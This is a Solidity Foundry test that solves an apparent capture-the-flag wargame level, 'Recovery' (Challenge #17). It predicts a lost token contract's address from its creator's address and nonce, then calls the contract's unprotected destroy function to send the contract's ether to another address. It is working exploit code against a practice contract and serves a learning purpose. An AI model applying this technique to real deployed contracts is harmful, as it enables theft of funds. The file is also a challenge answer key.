// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../Recovery.sol";

contract ContractTest is Test {
    Recovery r;
    SimpleToken s;

    function setUp() public {
        console.log("Challenge #17");
        r = new Recovery();
        r.generateToken("ABC", 1_000_000 * 1e18);
    }

    function test_challenge_17() public {
        address predict = address(
            uint256(
                keccak256(
                    abi.encodePacked(
                        bytes1(0xd6),
                        bytes1(0x94),
                        address(r),
                        bytes1(0x01)
                    )
                )
            )
        );
        console.log("Predicted address of token     ", predict);

        // Assume tokens lost
        deal(address(predict), 0.001 ether);
        console.log("Balance of predicted address   ", address(predict).balance);
        s = SimpleToken(payable(predict));
        s.destroy(payable(address(1337)));
        console.log("Balance of address(1337)       ", address(1337).balance);
    }
}
